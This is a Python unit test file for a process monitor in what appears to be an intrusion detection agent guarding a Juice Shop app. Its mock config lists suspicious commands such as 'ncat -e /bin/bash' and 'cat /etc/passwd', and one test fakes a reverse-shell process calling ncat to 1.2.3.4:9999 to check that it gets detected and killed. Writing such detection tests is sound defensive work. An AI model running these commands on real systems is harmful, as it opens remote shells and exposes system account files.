import unittest
from unittest.mock import MagicMock, patch, Mock
from multiprocessing import Queue, Event
import re

# Import the class to be tested
from monitors.process_monitor import ProcessMonitor

# Use mock_psutil if available, otherwise create manual mocks
try:
    import mock_psutil
except ImportError:
    mock_psutil = None

class TestProcessMonitor(unittest.TestCase):

    def setUp(self):
        """Set up a mock environment for each test."""
        self.mock_log_queue = MagicMock(spec=Queue)
        self.mock_threat_bus = MagicMock(spec=Queue)
        self.mock_monitor_queue = MagicMock(spec=Queue)
        self.mock_shutdown_event = MagicMock(spec=Event)

        # Mock the config.json structure
        self.mock_config = {
            "agent": {"heartbeat_interval_seconds": 0.1},
            "monitoring": {
                "process_monitoring": {
                    "enabled": True,
                    "processes": [
                        {
                            "name": "node",
                            "command_line_contains": "/home/juice/juice-shop/build/app.js"
                        }
                    ]
                }
            },
            "detection_rules": {
                "suspicious_commands": [
                    "ncat -l",
                    "ncat -e /bin/bash",
                    "cat /etc/passwd"
                ]
            }
        }
        
        # We need to mock the shutdown event to stop the 'run' loop
        self.mock_shutdown_event.is_set.side_effect = [False, True] # Run loop once, then stop

        self.monitor = ProcessMonitor(
            self.mock_config,
            self.mock_log_queue,
            self.mock_shutdown_event,
            self.mock_threat_bus,
            self.mock_monitor_queue
        )

    @patch('psutil.pids')
    @patch('psutil.Process')
    def test_suspicious_process_detection(self, mock_process, mock_pids):
        """
        Test if a new, suspicious process is correctly identified.
        """
        # --- Arrange ---
        # Mock psutil.pids() to show one existing PID, then a new suspicious one
        mock_pids.side_effect = [
            {100},  # First call (initializes known_pids)
            {100, 200}  # Second call (detects 200 as new)
        ]

        # Mock psutil.Process(200) to look like a reverse shell
        mock_proc_obj = MagicMock()
        mock_proc_obj.cmdline.return_value = ['ncat', '-e /bin/bash', '1.2.3.4', '9999']
        mock_proc_obj.name.return_value = 'ncat'
        mock_proc_obj.pid = 200
        mock_process.return_value = mock_proc_obj

        # --- Act ---
        self.monitor.run()

        # --- Assert ---
        # 1. Check if a "REVERSE-SHELL" alert was logged
        self.mock_log_queue.put.assert_called()
        log_call_args = self.mock_log_queue.put.call_args[0][0]
        self.assertEqual(log_call_args['event_type'], 'REVERSE-SHELL')
        self.assertEqual(log_call_args['level'], 'critical')
        self.assertEqual(log_call_args['action'], 'kill_process')
        self.assertEqual(log_call_args['details']['pid'], 200)

        # 2. Check if the threat was published to the bus
        self.mock_threat_bus.put.assert_called()
        threat_call_args = self.mock_threat_bus.put.call_args[0][0]
        self.assertEqual(threat_call_args['event_type'], 'SUSPICIOUS_PROCESS_DETECTED')
        self.assertEqual(threat_call_args['data']['pid'], 200)

    @patch('psutil.process_iter')
    def test_process_health_check(self, mock_process_iter):
        """
        Test if the monitor correctly tracks a configured process.
        """
        # --- Arrange ---
        # Mock the shutdown event to loop once
        self.mock_shutdown_event.is_set.side_effect = [False, True]
        
        # Mock a 'node' process that matches the config rule
        mock_proc_info = {
            'pid': 1234,
            'name': 'node',
            'cmdline': ['node', '/home/juice/juice-shop/build/app.js']
        }
        mock_proc_obj = MagicMock(info=mock_proc_info, pid=1234)
        mock_process_iter.return_value = [mock_proc_obj]

        # --- Act ---
        # Run _check_specific_processes (called by run)
        self.monitor.run() 

        # --- Assert ---
        # Check if an "info" alert was logged for tracking the process
        self.mock_log_queue.put.assert_called()
        log_call_args = self.mock_log_queue.put.call_args[0][0]
        
        self.assertEqual(log_call_args['event_type'], 'PROCESS-HEALTH')
        self.assertEqual(log_call_args['level'], 'info')
        self.assertIn("Started tracking monitored process", log_call_args['message'])
        self.assertIn('node', self.monitor.monitored_procs)
        self.assertEqual(self.monitor.monitored_procs['node']['pid'], 1234)

if __name__ == '__main__':
    unittest.main()